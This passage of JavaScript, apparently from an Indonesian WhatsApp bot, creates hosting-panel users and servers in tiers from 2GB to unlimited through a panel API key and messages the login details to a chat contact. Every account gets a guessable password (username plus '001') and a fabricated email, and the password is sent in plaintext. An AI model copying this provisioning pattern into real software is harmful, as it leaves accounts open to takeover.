"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + eggs, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + c_apikey
}
})
ctf = `\`Chat privat data panel\`

 ╭─ \`PROFIL PANEL\` 」
 │• 🖥 _USERNAME_ : ${monospa(user.username)}
 │• 🛡 _PASSWORD_ : ${monospa(password)}
 │• 🔗 _LOGIN_ : ××××××××
 ╰───── `

conn.sendButtonImage(u,  [{
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "Register",
      url: domain,
      merchant_url: domain
   })
}], m, {
   image: 'https://telegra.ph/file/50eefda72731d2b2336fb.jpg',
   body: ctf,
   footer: `📑 Note : _Jangan sampai hilang ataupun terhapus!!._`
});
// conn.sendMessage(u, { text: explist }, {quoted: VerifQuote })
let data2 = await f2.json();
//console.log(data.attributes.startup)
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + c_apikey,
},
"body": JSON.stringify({
"name": name,
"description": `Expired ` + getNextMonthDate(),
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
break
case "2gb": {
if (!isMurbug) return reply("_Harus user premium_")
let t = qtext.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
.${command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 2GB"
let egg = global.eggs
let loc = global.loca
let memo = "2048"
let cpu = "50"
let disk = "2091"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/2ae4161df4858b41d7acf.jpg" 
if (!u) return
let d = (await conn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + c_apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + eggs, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + c_apikey
}
})
ctf = `\`Chat privat data panel\`

 ╭─ \`PROFIL PANEL\` 」
 │• 🖥 _USERNAME_ : ${monospa(user.username)}
 │• 🛡 _PASSWORD_ : ${monospa(password)}
 │• 🔗 _LOGIN_ : ××××××××
 ╰───── `

conn.sendButtonImage(u,  [{
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "Register",
      url: domain,
      merchant_url: domain
   })
}], m, {
   image: 'https://telegra.ph/file/50eefda72731d2b2336fb.jpg',
   body: ctf,
   footer: `📑 Note : _Jangan sampai hilang ataupun terhapus!!._`
});
// conn.sendMessage(u, { text: explist }, {quoted: VerifQuote })
let data2 = await f2.json();
//console.log(data.attributes.startup)
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + c_apikey,
},
"body": JSON.stringify({
"name": name,
"description": `Expired ` + getNextMonthDate(),
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
break
case "3gb": {
if (!isMurbug) return reply("_Harus user premium_")
let t = qtext.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
.${command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 3GB"
let egg = global.eggs
let loc = global.loca
let memo = "3048"
let cpu = "70"
let disk = "3091"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/2ae4161df4858b41d7acf.jpg" 
if (!u) return
let d = (await conn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + c_apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + eggs, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + c_apikey
}
})
ctf = `\`Chat privat data panel\`

 ╭─ \`PROFIL PANEL\` 」
 │• 🖥 _USERNAME_ : ${monospa(user.username)}
 │• 🛡 _PASSWORD_ : ${monospa(password)}
 │• 🔗 _LOGIN_ : ××××××××
 ╰───── `

conn.sendButtonImage(u,  [{
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "Register",
      url: domain,
      merchant_url: domain
   })
}], m, {
   image: 'https://telegra.ph/file/50eefda72731d2b2336fb.jpg',
   body: ctf,
   footer: `📑 Note : _Jangan sampai hilang ataupun terhapus!!._`
});
// conn.sendMessage(u, { text: explist }, {quoted: VerifQuote })
let data2 = await f2.json();
//console.log(data.attributes.startup)
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + c_apikey,
},
"body": JSON.stringify({
"name": name,
"description": `Expired ` + getNextMonthDate(),
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
break
case "4gb": {
if (!isMurbug) return reply("_Harus user premium_")
let t = qtext.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
.${command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 4GB"
let egg = global.eggs
let loc = global.loca
let memo = "4048"
let cpu = "90"
let disk = "4091"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/2ae4161df4858b41d7acf.jpg" 
if (!u) return
let d = (await conn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + c_apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + eggs, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + c_apikey
}
})
ctf = `\`Chat privat data panel\`

 ╭─ \`PROFIL PANEL\` 」
 │• 🖥 _USERNAME_ : ${monospa(user.username)}
 │• 🛡 _PASSWORD_ : ${monospa(password)}
 │• 🔗 _LOGIN_ : ××××××××
 ╰───── `

conn.sendButtonImage(u,  [{
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "Register",
      url: domain,
      merchant_url: domain
   })
}], m, {
   image: 'https://telegra.ph/file/50eefda72731d2b2336fb.jpg',
   body: ctf,
   footer: `📑 Note : _Jangan sampai hilang ataupun terhapus!!._`
});
// conn.sendMessage(u, { text: explist }, {quoted: VerifQuote })
let data2 = await f2.json();
//console.log(data.attributes.startup)
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + c_apikey,
},
"body": JSON.stringify({
"name": name,
"description": `Expired ` + getNextMonthDate(),
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
break
case "5gb": {
if (!isMurbug) return reply("_Harus user premium_")
let t = qtext.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
.${command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 5GB"
let egg = global.eggs
let loc = global.loca
let memo = "5048"
let cpu = "110"
let disk = "5091"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/2ae4161df4858b41d7acf.jpg" 
if (!u) return
let d = (await conn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + c_apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + eggs, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + c_apikey
}
})
ctf = `\`Chat privat data panel\`

 ╭─ \`PROFIL PANEL\` 」
 │• 🖥 _USERNAME_ : ${monospa(user.username)}
 │• 🛡 _PASSWORD_ : ${monospa(password)}
 │• 🔗 _LOGIN_ : ××××××××
 ╰───── `

conn.sendButtonImage(u,  [{
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "Register",
      url: domain,
      merchant_url: domain
   })
}], m, {
   image: 'https://telegra.ph/file/50eefda72731d2b2336fb.jpg',
   body: ctf,
   footer: `📑 Note : _Jangan sampai hilang ataupun terhapus!!._`
});
// conn.sendMessage(u, { text: explist }, {quoted: VerifQuote })
let data2 = await f2.json();
//console.log(data.attributes.startup)
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + c_apikey,
},
"body": JSON.stringify({
"name": name,
"description": `Expired ` + getNextMonthDate(),
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "6gb": {
if (!isMurbug) return reply("_Harus user premium_")
let t = qtext.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
.${command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 6GB"
let egg = global.eggs
let loc = global.loca
let memo = "6048"
let cpu = "140"
let disk = "6091"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/2ae4161df4858b41d7acf.jpg" 
if (!u) return
let d = (await conn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + c_apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + eggs, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + c_apikey
}
})
ctf = `\`Chat privat data panel\`

 ╭─ \`PROFIL PANEL\` 」
 │• 🖥 _USERNAME_ : ${monospa(user.username)}
 │• 🛡 _PASSWORD_ : ${monospa(password)}
 │• 🔗 _LOGIN_ : ××××××××
 ╰───── `

conn.sendButtonImage(u,  [{
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "Register",
      url: domain,
      merchant_url: domain
   })
}], m, {
   image: 'https://telegra.ph/file/50eefda72731d2b2336fb.jpg',
   body: ctf,
   footer: `📑 Note : _Jangan sampai hilang ataupun terhapus!!._`
});
// conn.sendMessage(u, { text: explist }, {quoted: VerifQuote })
let data2 = await f2.json();
//console.log(data.attributes.startup)
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + c_apikey,
},
"body": JSON.stringify({
"name": name,
"description": `Expired ` + getNextMonthDate(),
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
break
case "7gb": {
if (!isMurbug) return reply("_Harus user premium_")
let t = qtext.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
.${command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 7GB"
let egg = global.eggs
let loc = global.loca
let memo = "7048"
let cpu = "160"
let disk = "7091"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/2ae4161df4858b41d7acf.jpg" 
if (!u) return
let d = (await conn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + c_apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + eggs, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + c_apikey
}
})
ctf = `\`Chat privat data panel\`

 ╭─ \`PROFIL PANEL\` 」
 │• 🖥 _USERNAME_ : ${monospa(user.username)}
 │• 🛡 _PASSWORD_ : ${monospa(password)}
 │• 🔗 _LOGIN_ : ××××××××
 ╰───── `

conn.sendButtonImage(u,  [{
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "Register",
      url: domain,
      merchant_url: domain
   })
}], m, {
   image: 'https://telegra.ph/file/50eefda72731d2b2336fb.jpg',
   body: ctf,
   footer: `📑 Note : _Jangan sampai hilang ataupun terhapus!!._`
});
// conn.sendMessage(u, { text: explist }, {quoted: VerifQuote })
let data2 = await f2.json();
//console.log(data.attributes.startup)
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + c_apikey,
},
"body": JSON.stringify({
"name": name,
"description": `Expired ` + getNextMonthDate(),
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
break
case "8gb": {
if (!isMurbug) return reply("_Harus user premium_")
let t = qtext.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
.${command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 8GB"
let egg = global.eggs
let loc = global.loca
let memo = "8048"
let cpu = "180"
let disk = "8091"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/2ae4161df4858b41d7acf.jpg" 
if (!u) return
let d = (await conn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + c_apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + eggs, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + c_apikey
}
})
ctf = `\`Chat privat data panel\`

 ╭─ \`PROFIL PANEL\` 」
 │• 🖥 _USERNAME_ : ${monospa(user.username)}
 │• 🛡 _PASSWORD_ : ${monospa(password)}
 │• 🔗 _LOGIN_ : ××××××××
 ╰───── `

conn.sendButtonImage(u,  [{
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "Register",
      url: domain,
      merchant_url: domain
   })
}], m, {
   image: 'https://telegra.ph/file/50eefda72731d2b2336fb.jpg',
   body: ctf,
   footer: `📑 Note : _Jangan sampai hilang ataupun terhapus!!._`
});
// conn.sendMessage(u, { text: explist }, {quoted: VerifQuote })
let data2 = await f2.json();
//console.log(data.attributes.startup)
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + c_apikey,
},
"body": JSON.stringify({
"name": name,
"description": `Expired ` + getNextMonthDate(),
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
break
case "9gb": {
if (!isMurbug) return reply("_Harus user premium_")
let t = qtext.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
.${command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " 9GB"
let egg = global.eggs
let loc = global.loca
let memo = "9048"
let cpu = "210"
let disk = "9091"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/2ae4161df4858b41d7acf.jpg" 
if (!u) return
let d = (await conn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + c_apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + eggs, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + c_apikey
}
})
ctf = `\`Chat privat data panel\`

 ╭─ \`PROFIL PANEL\` 」
 │• 🖥 _USERNAME_ : ${monospa(user.username)}
 │• 🛡 _PASSWORD_ : ${monospa(password)}
 │• 🔗 _LOGIN_ : ××××××××
 ╰───── `

conn.sendButtonImage(u,  [{
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "Register",
      url: domain,
      merchant_url: domain
   })
}], m, {
   image: 'https://telegra.ph/file/50eefda72731d2b2336fb.jpg',
   body: ctf,
   footer: `📑 Note : _Jangan sampai hilang ataupun terhapus!!._`
});
// conn.sendMessage(u, { text: explist }, {quoted: VerifQuote })
let data2 = await f2.json();
//console.log(data.attributes.startup)
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + c_apikey,
},
"body": JSON.stringify({
"name": name,
"description": `Expired ` + getNextMonthDate(),
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
break
case '0gb': case "unlimited": case 'unli': {
if (!isMurbug) return reply("_Harus user premium_")
let t = qtext.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
.${command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + " UNLI"
let egg = global.eggs
let loc = global.loca
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/2ae4161df4858b41d7acf.jpg" 
if (!u) return
let d = (await conn.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + c_apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + eggs, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + c_apikey
}
})
ctf = `\`Chat privat data panel\`

 ╭─ \`PROFIL PANEL\` 」
 │• 🖥 _USERNAME_ : ${monospa(user.username)}
 │• 🛡 _PASSWORD_ : ${monospa(password)}
 │• 🔗 _LOGIN_ : ××××××××
 ╰───── `

conn.sendButtonImage(u,  [{
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "Register",
      url: domain,
      merchant_url: domain
   })
}], m, {
   image: 'https://telegra.ph/file/50eefda72731d2b2336fb.jpg',
   body: ctf,
   footer: `📑 Note : _Jangan sampai hilang ataupun terhapus!!._`
});
// conn.sendMessage(u, { text: explist }, {quoted: VerifQuote })
let data2 = await f2.json();
//console.log(data.attributes.startup)
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + c_apikey,
},
"body": JSON.stringify({
"name": name,
"description": `Expired ` + getNextMonthDate(),
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
